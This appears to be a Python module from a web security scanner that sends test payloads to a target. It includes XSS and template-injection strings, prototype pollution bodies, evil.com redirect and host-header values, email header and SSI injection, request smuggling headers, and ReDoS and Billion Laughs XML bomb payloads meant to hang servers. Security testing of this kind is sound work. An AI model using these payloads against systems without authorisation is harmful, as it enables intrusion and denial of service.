from typing import Any, Dict
from ..http_client import HttpClient
from ..scenarios import SimpleScenario
import urllib.parse

def run_prototype_pollution(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Checks for Prototype Pollution in JSON bodies or Query Params.
    Payload: __proto__[polluted] = "true"
    Detection: Unreliable without server-side reflection, but we check specific nuances.
    """
    payloads = [
        {"__proto__": {"polluted": "true"}},
        {"constructor": {"prototype": {"polluted": "true"}}}
    ]
    
    issues = []
    
    for payload in payloads:
        # 1. Send Pollution
        client.send(scenario.method, scenario.target, json_body=payload)
        
        # 2. Check for symptoms (very hard in blackbox without crashing)
        # We might check if the server crashes (500) on subsequent requests or if logic changes.
        # But specifically, let's look for reflection of the polluted key if possible.
        
        # A simple valid check is to see if the payload itself caused a 500 error (often means unhandled merge)
        resp = client.send(scenario.method, scenario.target, json_body=payload)
        if resp.status_code == 500:
             issues.append("Possible Prototype Pollution (Server Error 500 on Prototype Injection)")
             
    passed = len(issues) == 0
    return {
        "scenario_id": scenario.id,
        "attack_type": "prototype_pollution",
        "passed": passed,
        "confidence": "LOW" if not passed else "LOW", # 500 error is weak signal
        "details": issues if not passed else "No immediate crash/error observed."
    }

def run_xss_scan(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Checks if script tags are returned unescaped.
    """
    payloads = [
        "<ScRiPt>alert(1)</sCrIpT>",
        "<script>alert(1)</script\x00>",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "<body/oNlOaD=alert(1)>",
        "java\tscript:alert(1)",
        "\"><svg/onload=alert(1)>",
        "{{7*7}}",
        "${7*7}",
        "'\"><img src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<math><a xlink:href=\"javascript:alert(1)\">X",
        "<iframe src=\"javascript:alert(1)\">",
        "<a href=\"j\na\nv\na\ns\nc\nr\ni\np\nt\n:alert(1)\">X</a>",
        # Expanded Payloads
        "javascript://%250Aalert(1)",
        "<img/src/onerror=alert(1)>",
        "<svg/onload=alert`1`>",
        "<marquee loop=1 width=0 onfinish=alert(1)>X</marquee>",
        "<input onfocus=alert(1) autofocus>",
        "<select autofocus><option>X</option></select>",
        "<textarea autofocus onfocus=alert(1)>",
        "<keygen autofocus onfocus=alert(1)>",
        "<video poster=javascript:alert(1)//>",
        "<isindex type=image src=1 onerror=alert(1)>",
        "<x onclick=alert(1) src=a>Click me</x>",
        "<source onbeforecut=alert(1)>",
        # Angular/Vue/React specific
        "{{constructor.constructor('alert(1)')()}}",
        "@{7*7}",
        "[[7*7]]"
    ]
    
    import concurrent.futures
    import threading
    fields = scenario.config.get("fields", ["q", "search", "name"])
    issues = []
    leaked_data = [] # Data context
    lock = threading.Lock() # Thread safety for appending results
    
    def check_xss(field):
        local_issues = []
        local_leaks = []
        
        for p in payloads:
            # OPTIMIZATION: Stop checking field if we already found an XSS in it (avoid spam)
            if local_issues: break 
            
            # Query Param Injection
            qs = {field: p}
            resp = client.send("GET", scenario.target, params=qs)
            if p in resp.text:
                 local_issues.append(f"Reflected XSS in param '{field}' with payload: {p}")
                 # Capture snippet where reflection happened
                 idx = resp.text.find(p)
                 snippet = resp.text[max(0, idx-20):min(len(resp.text), idx+len(p)+20)]
                 local_leaks.append(f"Reflected Snippet: ...{snippet}...")
                 break # Found one for this field
                 
            # Body Injection (if POST)
            if scenario.method == "POST":
                resp_post = client.send("POST", scenario.target, json_body={field: p})
                if p in resp_post.text:
                    local_issues.append(f"Reflected XSS in JSON field '{field}'")
                    idx = resp_post.text.find(p)
                    snippet = resp_post.text[max(0, idx-20):min(len(resp_post.text), idx+len(p)+20)]
                    local_leaks.append(f"Reflected Snippet: ...{snippet}...")
                    break
        
        # Merge back safely
        if local_issues:
            with lock:
                issues.extend(local_issues)
                leaked_data.extend(local_leaks)

    # PARALLEL EXECUTION: Field Level is safer than Payload level due to break logic
    # But payload level is faster. Since we break on first find per field, let's parallelize FIELDS.
    # If fields are few (e.g. 1-2), this won't help much.
    # User wants SPEED. Let's flatten (field, payload) tuples, but then we lose the "break on first success" optimization efficiency.
    # Best compromise: Parallelize Fields.
    # Best compromise: Parallelize Fields.
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(50, len(fields) + 1)) as executor:
        executor.map(check_xss, fields)

    passed = len(issues) == 0
    
    return {
        "scenario_id": scenario.id,
        "attack_type": "xss",
        "passed": passed,
        "confidence": "CONFIRMED" if not passed else "LOW", # Reflection is definitive
        "details": {"found": issues, "leaked_data": leaked_data} if not passed else "No XSS reflection found."
    }

def run_open_redirect(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Checks for Open Redirect Vulnerabilities.
    """
    payloads = [
        "http://evil.com",
        "//evil.com",
        "https://google.com"
    ]
    fields = scenario.config.get("fields", ["next", "url", "redirect", "returnTo"])
    issues = []
    leaked_data = []
    
    for field in fields:
        for p in payloads:
            qs = {field: p}
            # prevent auto-redirect to capture the 3xx header
            resp = client.send("GET", scenario.target, params=qs) 
            
            # Check headers manual (HttpClient follows redirects by default? 
            # We implemented allow_redirects=False logic in Engine? No.
            # HttpClient uses requests.Session().request which follows by default.
            # We should probably check the history or final URL if it followed.
            
            # If we ended up at evil.com (or google)
            if "google.com" in resp.url or "evil.com" in resp.url:
                 issues.append(f"Open Redirect found in '{field}' -> {resp.url}")
                 leaked_data.append(f"Redirected To: {resp.url}")
                 break

    passed = len(issues) == 0
    return {
        "scenario_id": scenario.id,
        "attack_type": "open_redirect",
        "passed": passed,
        "confidence": "HIGH" if not passed else "LOW",
        "details": {"issues": issues, "leaked_data": leaked_data} if not passed else "No open redirects found."
    }

def run_advanced_dos(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Checks for Application-Layer DoS (ReDoS, XML Bomb).
    WARNING: This can hang the server processing thread.
    """
    issues = []
    
    issues = []
    
    # 1. ReDoS (Regular Expression Denial of Service)
    # Common triggers: Email validators, URL validators
    redos_payloads = [
        # The Classic Email ReDoS
        "a" * 10000 + "@a.com",
        "a" * 10000 + "!",
        # URL Regex ReDoS
        "http://" + "a" * 10000 + ".com",
        # Catastrophic Backtracking Generic
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
        "((a)+)+" + "!", # Exponential Backtracking (CPU Killer)
        "a" * 100000, # Large String (Memory Stress)
    ]
    
    # Aggressive: Mega-Payloads for Resource Exhaustion
    if scenario.config.get("aggressive"):
        print("    [!!!] Using MEGA-PAYLOADS for ReDoS/Memory Exhaustion...")
        redos_payloads.append("A" * 1000000) # 1MB String (Memory/JSON Parser Stress)
        redos_payloads.append("1" * 1000000) # Integer/Number parser stress
    
    # 2. XML Bomb (Billion Laughs)
    # Only works if endpoint accepts XML (we check heuristically)
    xml_bomb = """<?xml version="1.0"?>
    <!DOCTYPE lolz [
     <!ENTITY lol "lol">
     <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
     <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
     <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
     <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
     <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
     <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
     <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
     <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
     <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
    ]>
    <lolz>&lol9;</lolz>"""

    # Execution Loop
    fields = scenario.config.get("fields", ["email", "url", "comment", "body"])
    
    import time
    
    # Check ReDoS if fields exist
    for field in fields:
        for p in redos_payloads:
            start = time.time()
            try:
                # 5-second timeout. If it hangs, we might have hit it.
                client.send(scenario.method, scenario.target, json_body={field: p}, timeout=5.0)
            except Exception: 
                pass
            
            duration = time.time() - start
            if duration > 4.5: # If it timed out or took very long
                 issues.append(f"ReDoS Vulnerability/Hang in '{field}' (Time: {duration:.2f}s)")

    # Check XML Bomb (only if method allows body)
    if scenario.method in ["POST", "PUT"]:
        start = time.time()
        try:
             client.send(scenario.method, scenario.target, form_body=xml_bomb, headers={"Content-Type": "application/xml"}, timeout=5.0)
        except: pass
        
        duration = time.time() - start
        if duration > 4.5:
            issues.append("XML Bomb (Billion Laughs) Processing Detected (Hang/Timeout)")

    return {
        "scenario_id": scenario.id,
        "attack_type": "advanced_dos",
        "passed": len(issues) == 0,
        "confidence": "HIGH" if issues else "LOW",
        "details": {"issues": issues} if issues else "No DoS vulnerabilities detected."
    }

# --- NEW ADVANCED ATTACKS ---

def run_clickjacking(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Checks for missing X-Frame-Options or CSP frame-ancestors."""
    resp = client.send("GET", scenario.target)
    issues = []
    xfo = resp.headers.get("X-Frame-Options", "").lower()
    csp = resp.headers.get("Content-Security-Policy", "").lower()
    
    if "deny" not in xfo and "sameorigin" not in xfo:
        if "frame-ancestors" not in csp:
            issues.append("Clickjacking Risk: Missing X-Frame-Options and CSP frame-ancestors.")
            
    return {"scenario_id": scenario.id, "attack_type": "clickjacking", "passed": not issues, "details": issues}

def run_cors_misconfig(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Checks for reckless CORS configurations like Access-Control-Allow-Origin: *"""
    # 1. Null Origin
    resp = client.send("OPTIONS", scenario.target, headers={"Origin": "null"})
    issues = []
    acao = resp.headers.get("Access-Control-Allow-Origin", "")
    if acao == "*" or acao == "null":
        issues.append(f"CORS Misconfiguration: Wildcard/Null Origin Allowed (Origin: {acao})")
        
    return {"scenario_id": scenario.id, "attack_type": "cors_origin", "passed": not issues, "details": issues}

def run_host_header_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Injects Malicious Host Headers to check for Poisoning."""
    evil_host = "evil.com"
    resp = client.send("GET", scenario.target, headers={"Host": evil_host, "X-Forwarded-Host": evil_host})
    issues = []
    if evil_host in resp.headers.get("Location", "") or evil_host in resp.text:
         issues.append("Host Header Injection: 'evil.com' reflected in response.")
         
    return {"scenario_id": scenario.id, "attack_type": "host_header", "passed": not issues, "details": issues}

def run_email_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Checks for Email Header Injection (CC/BCC spamming)."""
    payload = "user@test.com%0ABcc:victim@evil.com"
    field = scenario.config.get("fields", ["email"])[0]
    resp = client.send("POST", scenario.target, json_body={field: payload})
    issues = []
    # Hard to verify blackbox without receipt, checking for error/success anomalies
    if resp.status_code == 200 and "victim@evil.com" in resp.text:
         issues.append("Possible Email Header Injection (Reflected payload/headers).")
    return {"scenario_id": scenario.id, "attack_type": "email_injection", "passed": not issues, "details": issues}

def run_ssi_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Server Side Include Injection."""
    payload = '<!--#exec cmd="ls" -->'
    resp = client.send("GET", scenario.target, params={"q": payload})
    issues = []
    if "bin" in resp.text and "boot" in resp.text:
        issues.append("SSI Injection: 'ls' output detected.")
    return {"scenario_id": scenario.id, "attack_type": "ssi_injection", "passed": not issues, "details": issues}

def run_request_smuggling(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Checks for CL.TE / TE.CL Desync vulnerabilities (Basic Heuristic)."""
    # This usually requires a raw socket or specialized tool, but we can try simple conflicting headers.
    headers = {
        "Transfer-Encoding": "chunked",
        "Content-Length": "4"
    }
    body = "0\r\n\r\nG"
    try:
        resp = client.send("POST", scenario.target, headers=headers, form_body=body, timeout=5)
        issues = []
        if resp.status_code >= 500 or resp.elapsed_ms > 3000:
             issues.append("Potential Request Smuggling (Server Error/Timeout on CL.TE conflict).")
        return {"scenario_id": scenario.id, "attack_type": "request_smuggling", "passed": not issues, "details": issues}
    except:
        return {"scenario_id": scenario.id, "attack_type": "request_smuggling", "passed": True, "details": "Connection failed."}

def run_graphql_introspection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Checks if GraphQL Introspection is enabled."""
    query = {"query": "{__schema{types{name}}}"}
    resp = client.send("POST", scenario.target, json_body=query)
    issues = []
    if "__schema" in resp.text and "types" in resp.text:
        issues.append("GraphQL Introspection Enabled (Full Schema Access).")
    return {"scenario_id": scenario.id, "attack_type": "graphql_introspection", "passed": not issues, "details": issues}

def run_graphql_batching(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """Checks for Batching/Alias support (DoS vector)."""
    query = {"query": "query { a: __typename b: __typename c: __typename }"}
    resp = client.send("POST", scenario.target, json_body=query)
    issues = []
    if '"a":"' in resp.text and '"b":"' in resp.text:
         issues.append("GraphQL Batching Supported (Potential DoS Vector).")
    return {"scenario_id": scenario.id, "attack_type": "graphql_batching", "passed": not issues, "details": issues}
